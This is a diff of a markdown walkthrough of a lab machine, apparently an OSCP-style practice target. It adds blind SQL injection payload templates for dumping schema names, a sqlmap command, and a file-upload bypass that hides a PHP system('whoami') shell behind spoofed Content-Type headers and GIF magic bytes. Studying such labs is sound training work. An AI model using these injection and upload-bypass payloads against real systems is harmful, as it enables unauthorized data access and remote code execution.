@@ -695,7 +695,9 @@ being said that we will proceed to filter
 
 the lenght of each DBS, Tables, Columns
 
-to make a python script 
+to make a python script for the  DBS would be 
+
+```'+and+(select+substring(schema_name,{position_character},1)+from+information_schema.schemata+limit+{dbs},1)='{character}"```
 
 ```python 
 from pwn import *
@@ -975,7 +977,8 @@ output
 [ ] Fuerza bruta: http://192.168.100.52/imfadministrator/cms.php?pagename=home'+and+(select+substring(schema_name,29,1)+from+information_schema.schemata+limit+5,1)='_
 [+] Databases: information_schema,admin,mysql,performance_schema,sys,
 ```
-now let's find the tables 
+now let's find the tables ```+and+(select+substring(table_name,{position_character},1)+from+information_schema.tables+where+table_schema='admin'+limit+{dbs},1)='{character}"```
+
 ```python
    1   │ from pwn import *
    2   │ import requests, pdb, signal, time, sys, string
@@ -1045,7 +1048,7 @@ output
 [v] Tables: pages
 
 ```
-now let's find the columns 
+now let's find the columns. ```+and+(select+substring(column_name,{position_character},1)+from+information_schema.columns+where+table_schema='admin'+and+table_name='pages'+limit+{dbs},1)='{character}"```
 
 ```python3
    1   │ from pwn import *
@@ -1117,7 +1120,7 @@ now let's find the columns
   
   ```
   
-  now for the data is impotant to find where dbs are opened in this session 
+  now for the data is important to find where dbs are opened in this session 
   
   from  the BurpSuite /imfadministrator/cms.php?pagename=home'+and+(select+database())%3d'admin
   
@@ -1325,4 +1328,245 @@ Menu: Home | Upload Report | Disavowed list | Logout
 Welcome to the IMF Administration.
 
 ```
-let's try them 
+let's try the new ones which is ```tutorials``` , ```tutorials-incomplete``` and upload
+
+i got to tell you that actually sqmap will automate this attack but in OSCP we are no able to use SQL map so for that reason is better to try to do almost all the things manually 
+
+for example 
+
+```bash
+❯ sqlmap -u "http://192.168.100.52/imfadministrator/cms.php?pagename=home" --cookie "PHPSESSID=rftk9b1ducfunqjmrks8bcfb04" --dbs --dbms=mysql --batch
+``` 
+
+well trying the routes that we saw before let's try them 
+```bash
+http://192.168.100.52/imfadministrator/cms.php?pagename=tutorials-incomplete
+```
+here we found a flag in QR code 
+
+```php 
+flag4{dXBsb2Fkcjk0Mi5waHA=}
+
+```
+
+seems to be base64 encode let;s encrypt it 
+
+
+```bash 
+❯ echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
+uploadr942.php
+
+```
+
+seems to be a route let's get them 
+
+```php
+http://192.168.100.52/imfadministrator/uploadr942.php
+```
+output 
+
+```bash 
+Intelligence Upload Form
+File to upload: Sin archivos seleccionados
+
+upload
+```
+
+seems that we can upload an LFI let's try it 
+
+first of all we need to create the LFI 
+
+
+```php 
+<?
+   system("whoami")
+?>
+
+```
+let's try to upload 
+
+
+output
+
+
+```php
+Error: Invalid file type.
+File to upload: Sin archivos seleccionados
+```
+
+This can be due to incorrect extension or content type, or the server may interpret the first bytes of the script as magic numbers.
+
+Let's mitigate all the vulnerabilities that we thought of
+
+extentions
+we have to intercept the upload, and we could make a sniper attack with BurpSuite
+
+step 1 intercept the upload by turnning on the "interception tab of burpSuite"
+
+step 2 upload 
+
+and from my side i receive this output 
+
+```php
+POST /imfadministrator/uploadr942.php HTTP/1.1
+
+Host: 192.168.100.52
+
+Content-Length: 316
+
+Cache-Control: max-age=0
+
+Upgrade-Insecure-Requests: 1
+
+Origin: http://192.168.100.52
+
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+Referer: http://192.168.100.52/imfadministrator/uploadr942.php
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: es-419,es;q=0.9
+
+Cookie: PHPSESSID=rftk9b1ducfunqjmrks8bcfb04
+
+Connection: close
+
+
+
+------WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+Content-Disposition: form-data; name="file"; filename="whoami.php"
+
+Content-Type: application/x-php
+
+
+
+<?php
+system("whoami")
+?>
+
+
+------WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+Content-Disposition: form-data; name="submit"
+
+
+
+Upload
+
+------WebKitFormBoundary5RKwj5GwTJjAOK9j--
+
+
+```
+press ```ctrl + i``` to send this to the intruder 
+
+go to ```intruder``` press ```clear§``` and select the extention that we upload and press ```add``` example  it will appear likes this filename="whoami.```§php§" ```
+
+go to payload tab ```payload``` go to add section and add the extentions example ```php1```,```php2```,```php3```,```html```,```jpg```,```gif```,```exe```,```php4```,```php5```,```pht```,```phtml```,```png```,```phar```
+
+go to options tab and go to ```Grep - Extract``` and select ```add``` then ```fetch response``` 
+and select ```bash Error: Invalid file type```
+
+finally go to payloads 
+
+and  press ```Start attack```
+
+output
+
+```bash 
+ Error: Invalid file type
+```
+content type
+
+Therefore, since we uploaded a .php file, I think it is interpreting something other than the extensions.
+
+because if we check our > ```intruder``` > ```image Upload``` > ```Positions```
+
+and take a look 
+```php
+------WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+Content-Disposition: form-data; name="file"; filename="whoami.§php§"
+
+Content-Type: application/x-php
+
+```
+the content type is ```Content-Type: application/x-php``` 
+
+let's change it 
+
+the content type would be ```Content-Type: images/jpg```
+
+```php
+
+------WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+Content-Disposition: form-data; name="file"; filename="whoami.§php§"
+
+Content-Type: images/jpg
+
+
+```
+let's try with another type
+
+
+```php
+
+------WebKitFormBoundary5RKwj5GwTJjAOK9j
+
+Content-Disposition: form-data; name="file"; filename="whoami.§php§"
+
+Content-Type: images/jpeg
+
+
+```
+
+magic numbers
+
+let's try with changing the magic numbers, because idk if you know but  The first magic numbers, initially when you want to investigate a file, 
+
+
+for example, when you are doing a Buffer Over Flow, the first thing would be to see what kind of binary it is, so we apply a ```file``` command to check the file
+
+```bash
+❯ file whoami.php
+whoami.php: ASCII text
+```
+
+
+to see what type of file it is. This is based on the first bytes of the file's content.
+
+```bash
+
+   1   │ GIF8;
+   2   │ <?php
+   3   │ system("whoami")
+   4   │ ?>
+
+```
+now we changed it so let's try to check again 
+
+```bash
+❯ file whoami.php
+whoami.php: GIF image data 16188 x 26736
+```
+
+it says that is a gif because of the magic numbers, if you want to check more datailed apply a ```xxd``` command to check the first bytes of the file 
+
+```bash 
+❯ xxd whoami.php
+00000000: 4749 4638 3b0a 3c3f 7068 700a 7379 7374  GIF8;.<?php.syst
+00000010: 656d 2822 7768 6f61 6d69 2229 0a3f 3e0a  em("whoami").?>.
+
+```
+
+
+let's try to upload 
+
+
+
